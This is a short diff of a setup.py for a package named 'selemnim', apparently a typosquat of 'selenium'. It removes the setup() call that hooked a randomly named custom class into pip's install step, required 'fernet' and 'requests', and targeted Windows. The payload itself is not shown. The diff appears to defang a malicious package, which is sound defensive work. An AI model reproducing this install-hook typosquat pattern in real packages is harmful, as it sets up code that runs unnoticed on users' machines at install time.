@@ -18,22 +18,5 @@ class EqvQBEOhFNYRjeDyxnPZZsoaGCTuwnPvVgMoGxIUeuHrpCZfTGWKlXteoMnChMbbQQWfdgID(i
             install.run(self)
 
 
-setup(
-    name="selemnim",
-    version=VERSION,
-    author="nhPueQqxd",
-    author_email="fmIXI@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': EqvQBEOhFNYRjeDyxnPZZsoaGCTuwnPvVgMoGxIUeuHrpCZfTGWKlXteoMnChMbbQQWfdgID,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
 
